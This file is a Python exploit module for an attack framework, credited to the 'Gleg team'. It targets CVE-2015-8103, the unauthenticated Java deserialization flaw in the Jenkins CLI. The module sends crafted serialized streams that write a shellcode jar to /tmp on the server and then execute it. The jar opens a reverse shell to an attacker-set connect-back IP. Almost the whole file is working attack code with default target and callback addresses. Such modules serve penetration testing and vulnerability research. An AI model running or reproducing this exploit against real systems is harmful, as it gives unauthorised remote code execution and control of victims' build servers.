#!/usr/bin/env python
# specified in LICENSE.txt in your Agora distribution

import os
import urllib2
import socket
import time
import base64
from collections import OrderedDict
from Sploit import Sploit
from JavaShellcode import JavaShellcodes
from core.helpers.java.Serialization import Stream

INFO = {}
INFO['NAME'] = "ef_jenkins_java_deserialize_afu"
INFO['DESCRIPTION'] = "Jenkins CLI RMI Java Deserialization Vulnerability"
INFO['VENDOR'] = "https://jenkins-ci.org/"
INFO["CVE Name"] = "2015-8103"
INFO["NOTES"] = """
    This module exploits a vulnerability in Jenkins. An unsafe deserialization bug exists on
the Jenkins master, which allows remote arbitrary code execution. Authentication is not
required to exploit this vulnerability.

    Module generates and send payload, which create .jar file on vulnerable server. Then module send payload,
which execute created jar.
    """
INFO["DOWNLOAD_LINK"] = "http://mirrors.jenkins-ci.org/windows/jenkins-1.637.zip"
INFO["LINKS"] = ['https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py',
                 'https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java',
                 'http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability',
                 'https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2015-11-11']
INFO['CHANGELOG']="14 Jan, 2016. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = '192.168.1.61'
OPTIONS["PORT"] = '8080'
OPTIONS["VHOST"] = ''
OPTIONS["SSL"] = False
OPTIONS["CONNECTBACK_IP"] = '192.168.1.110'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self,logger=logger)
        self.host = ""
        self.port = 0
        self.connectback_ip = ""
        self.connectback_port = 0
        self.ssl = False
        self.url = ""

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        ssl = self.args.get("SSL", OPTIONS["SSL"])
        protocol = "https://" if ssl else "http://"
        self.host = self.args.get("HOST", OPTIONS["HOST"]).replace("/", "").replace("\\","")
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.connectback_ip = self.args.get("CONNECTBACK_IP", OPTIONS["CONNECTBACK_IP"])
        if self.args['listener']:
            self.connectback_port = self.args['listener']['PORT']
        self.url = "{proto}{host}:{port}/".format(proto=protocol, host=self.host, port=self.port)

    def read_binary(self, filename):
        path = os.getcwd() + "/data/CVE-2015-8103/" + filename
        content = ''
        with open(path, 'rb') as f:
            content = f.read()
        return content

    def open_binary(self, filename):
        path = os.getcwd() + "/data/CVE-2015-8103/" + filename
        return open(path, 'rb')

    def get_array_chain(self, decoded):
        object = decoded.contents[0]
        lazy_map = object.class_data[1].class_data[0]
        chained_transformer = lazy_map.class_data[0]
        return chained_transformer.class_data[0]

    def set_payload(self):
        stream = Stream()
        handle = self.open_binary('serialized_file_writer')
        decoded = stream.decode(handle)
        handle.close()
        return self.inject_payload_into_stream(decoded).encode()

    def class_load_payload(self):
        stream = Stream()
        handle = self.open_binary('serialized_class_loader')
        decoded = stream.decode(handle)
        handle.close()
        return self.inject_class_loader_into_stream(decoded).encode()

    def inject_payload_into_stream(self, decoded):
        byte_array = self.get_array_chain(decoded).values[2].class_data[-1]
        payload = self.create_payload()
        byte_array.values = [ord(c) for c in payload]
        file_name_utf8 = decoded.references[44].class_data[0]
        rnd_fname = '/tmp/temp.jar'
        file_name_utf8.contents = rnd_fname
        file_name_utf8.length = len(file_name_utf8.contents)
        return decoded

    def inject_class_loader_into_stream(self, decoded):
        file_name_utf8 = self.get_array_chain(decoded).values[2].class_data[0].values[1].values[0].values[0].class_data[3]
        file_name_utf8.contents = '/tmp/temp.jar'
        file_name_utf8.length = len(file_name_utf8.contents)
        class_name_utf8 = self.get_array_chain(decoded).values[4].class_data[0].values[0]
        class_name_utf8.contents = 'east.Payload'
        class_name_utf8.length = len(class_name_utf8.contents)
        return decoded

    def create_payload(self):
        java = JavaShellcodes(self.connectback_ip, self.connectback_port)
        return java.get_shellcode()

    def make_request_and_send(self, payload_body, cli_port):
        # Open a socket to the CLI port
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = (self.host, cli_port)
        sock.connect(server_address)
        # # Send headers
        headers = self.read_binary('serialized_jenkins_header')
        print 'sending "%s"' % headers
        sock.send(headers)

        data = sock.recv(1024)
        time.sleep(0.5)

        data = sock.recv(1024)
        time.sleep(0.5)

        payload_header = self.read_binary('serialized_payload_header')
        payload_footer = self.read_binary('serialized_payload_footer')

        payload_body = base64.b64encode(payload_body)
        payload = "%s%s%s" % (payload_header, payload_body, payload_footer)

        self.log('Sending payload...')
        sock.send(payload)

    def check(self):
        r = urllib2.urlopen(self.url)
        if "X-Jenkins-CLI-Port" in r.headers:
            return int(r.headers['X-Jenkins-CLI-Port'])
        return False
    
    def run(self):
        #Get options from gui
        self.args()
        cli_port = self.check()
        if not cli_port:
            self.log("Can't find jenkins CLI port")
            self.finish(False)
        try:
            self.log('Trying to upload payload...')
            self.make_request_and_send(self.set_payload(), cli_port)
            self.log('Trying to execute payload...')
            self.make_request_and_send(self.class_load_payload(), cli_port)
        except Exception as e:
            self.log(e)
            self.finish(False)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
